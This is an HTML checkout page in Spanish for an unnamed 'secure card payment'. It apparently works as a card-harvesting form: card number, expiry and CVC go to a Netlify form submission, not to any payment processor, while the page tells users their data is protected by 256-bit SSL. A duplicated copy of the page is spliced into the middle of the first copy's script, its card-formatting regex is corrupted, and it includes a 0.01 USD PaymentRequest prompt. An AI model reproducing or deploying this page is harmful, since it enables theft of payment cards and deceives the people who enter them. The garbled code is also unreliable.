<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pago Seguro con Tarjeta</title>
    <link rel="stylesheet" href="styles.css">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600&display=swap" rel="stylesheet">
</head>

<body>
    <div class="background-blobs">
        <div class="blob blob-1"></div>
        <div class="blob blob-2"></div>
        <div class="blob blob-3"></div>
    </div>

    <main class="payment-container">
        <div class="card-preview">
            <div class="card-glass">
                <div class="card-header">
                    <span class="chip"></span>
                    <span class="logo">VISA</span>
                </div>
                <div class="card-body">
                    <div class="card-number-preview">•••• •••• •••• ••••</div>
                    <div class="card-details">
                        <div class="card-holder-preview">
                            <span class="label">Titular</span>
                            <span class="value">Nombre Apellido</span>
                        </div>
                        <div class="card-date-preview">
                            <span class="label">Expira</span>
                            <span class="value">MM/AA</span>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <form class="payment-form" name="payment" method="POST" data-netlify="true" action="success.html">
            <h1>Detalles de Pago</h1>

            <div class="form-group">
                <label for="cc-number">Número de tarjeta</label>
                <div class="input-wrapper">
                    <input type="tel" id="cc-number" name="cardnumber" autocomplete="cc-number"
                        placeholder="0000 0000 0000 0000" pattern="[0-9\s]{13,19}" maxlength="19" inputmode="numeric"
                        required>
                    <i class="icon-card"></i>
                </div>
            </div>

            <div class="form-row">
                <div class="form-group half">
                    <label for="cc-exp">Vencimiento</label>
                    <div class="input-wrapper">
                        <input type="text" id="cc-exp" name="cc-exp" autocomplete="cc-exp" placeholder="MM/AA"
                            maxlength="5" required>
                    </div>
                </div>

                <div class="form-group half">
                    <label for="cc-csc">CVC / CVV</label>
                    <div class="input-wrapper">
                        <input type="tel" id="cc-csc" name="cvc" autocomplete="cc-csc" placeholder="123"
                            pattern="[0-9]{3,4}" maxlength="4" inputmode="numeric">
                        <i class="icon-lock"></i>
                    </div>
                </div>
            </div>

            <button type="submit" class="pay-button">
                Pagar Ahora
            </button>
            <p class="security-note">
                <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                    <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
                    <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
                </svg>
                Tus datos están protegidos con encriptación SSL de 256 bits.
            </p>
        </form>
    </main>

    <script>
        const numInput = document.getElementById('cc-number');
        const expInput = document.getElementById('cc-exp');

        const previewNum = document.querySelector('.card-number-preview');
        const previewExp = document.querySelector('.card-date-preview .value');

        numInput.addEventListener('input', (e) => {
            let val = e.target.value.replace(/\D/g, '').substring(0, 16);
            val = val != '' ? val.match(/.{1,4}/g).join(' ') : '';
            e.target.value = val;
            previewNum.textContent = val || '•••• •••• •••• ••••';
        });

        expInput.addEventListener('input', (e) => {
            let val = e.target.value.replace(/\D/g, '').substring(0, 4);
            if (val.length >= 2) val = val.substring(0, 2) + '/' + val.substring(2);
< !DOCTYPE html >
                <html lang="es">

                    <head>
                        <meta charset="UTF-8">
                            <meta name="viewport" content="width=device-width, initial-scale=1.0">
                                <title>Pago Seguro con Tarjeta</title>
                                <link rel="stylesheet" href="styles.css">
                                    <link rel="preconnect" href="https://fonts.googleapis.com">
                                        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
                                            <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600&display=swap" rel="stylesheet">
                                            </head>

                                            <body>
                                                <div class="background-blobs">
                                                    <div class="blob blob-1"></div>
                                                    <div class="blob blob-2"></div>
                                                    <div class="blob blob-3"></div>
                                                </div>

                                                <main class="payment-container">
                                                    <div class="card-preview">
                                                        <div class="card-glass">
                                                            <div class="card-header">
                                                                <span class="chip"></span>
                                                                <span class="logo">VISA</span>
                                                            </div>
                                                            <div class="card-body">
                                                                <div class="card-number-preview">•••• •••• •••• ••••</div>
                                                                <div class="card-details">
                                                                    <div class="card-holder-preview">
                                                                        <span class="label">Titular</span>
                                                                        <span class="value">Nombre Apellido</span>
                                                                    </div>
                                                                    <div class="card-date-preview">
                                                                        <span class="label">Expira</span>
                                                                        <span class="value">MM/AA</span>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>

                                                    <form class="payment-form" name="payment" method="POST" data-netlify="true" action="success.html">
                                                        <h1>Detalles de Pago</h1>

                                                        <div class="form-group">
                                                            <label for="cc-number">Número de tarjeta</label>
                                                            <div class="input-wrapper">
                                                                <input type="tel" id="cc-number" name="cardnumber" autocomplete="cc-number"
                                                                    placeholder="0000 0000 0000 0000" pattern="[0-9\s]{13,19}" maxlength="19" inputmode="numeric"
                                                                    required>
                                                                    <i class="icon-card"></i>
                                                            </div>
                                                        </div>

                                                        <div class="form-row">
                                                            <div class="form-group half">
                                                                <label for="cc-exp">Vencimiento</label>
                                                                <div class="input-wrapper">
                                                                    <input type="text" id="cc-exp" name="cc-exp" autocomplete="cc-exp" placeholder="MM/AA"
                                                                        maxlength="5" required>
                                                                </div>
                                                            </div>

                                                            <div class="form-group half">
                                                                <label for="cc-csc">CVC / CVV</label>
                                                                <div class="input-wrapper">
                                                                    <input type="tel" id="cc-csc" name="cvc" autocomplete="cc-csc" placeholder="123"
                                                                        pattern="[0-9]{3,4}" maxlength="4" inputmode="numeric">
                                                                        <i class="icon-lock"></i>
                                                                </div>
                                                            </div>
                                                        </div>

                                                        <button type="submit" class="pay-button">
                                                            Pagar Ahora
                                                        </button>
                                                        <p class="security-note">
                                                            <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                                                                <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
                                                                <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
                                                            </svg>
                                                            Tus datos están protegidos con encriptación SSL de 256 bits.
                                                        </p>
                                                    </form>
                                                </main>

                                                <script>
                                                    const numInput = document.getElementById('cc-number');
                                                    const expInput = document.getElementById('cc-exp');

                                                    const previewNum = document.querySelector('.card-number-preview');
                                                    const previewExp = document.querySelector('.card-date-preview .value');

        numInput.addEventListener('input', (e) => {
                                                        let val = e.target.value.replace(/\D/g, '').substring(0, 16);
                                                    val = val != '' ? val.match(/.{1, 4}/g).join(' ') : '';
                                                    e.target.value = val;
                                                    previewNum.textContent = val || '•••• •••• •••• ••••';
        });

        expInput.addEventListener('input', (e) => {
                                                        let val = e.target.value.replace(/\D/g, '').substring(0, 4);
            if (val.length >= 2) val = val.substring(0, 2) + '/' + val.substring(2);
                                                    e.target.value = val;
                                                    previewExp.textContent = val || 'MM/AA';
        });

                                                    // Payment Request API for Google Pay
                                                    const form = document.querySelector('.payment-form');

        form.addEventListener('submit', async (e) => {
                                                        e.preventDefault();

                                                    if (!window.PaymentRequest) {
                                                        alert('Tu navegador no soporta Google Pay');
                                                    return;
            }

                                                    try {
                const supportedInstruments = [{
                                                        supportedMethods: 'basic-card',
                                                    data: {
                                                        supportedNetworks: ['visa', 'mastercard', 'amex'],
                                                    supportedTypes: ['credit', 'debit']
                    }
                }];

                                                    const details = {
                                                        total: {
                                                        label: 'Total',
                                                    amount: {currency: 'USD', value: '0.01' }
                    }
                };

                                                    const request = new PaymentRequest(supportedInstruments, details);
                                                    const response = await request.show();
                                                    await response.complete('success');

                                                    // Mostrar mensaje de éxito en la misma página
                                                    form.innerHTML = `
                                                    <div style="text-align: center; padding: 3rem;">
                                                        <div style="width: 80px; height: 80px; background: linear-gradient(135deg, #22c55e, #16a34a); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 1.5rem; color: white; font-size: 2.5rem;">✓</div>
                                                        <h2 style="margin-bottom: 1rem;">¡Listo!</h2>
                                                        <p style="color: var(--text-dim);">Si Chrome mostró el diálogo, tu tarjeta fue guardada en Google Pay.</p>
                                                    </div>
                `;

            } catch (err) {
                if (err.name !== 'AbortError') {
                    console.error('Error:', err);
                    alert('Hubo un error. Por favor intenta de nuevo.');
                }
            }
        });
    </script>
</body>

</html>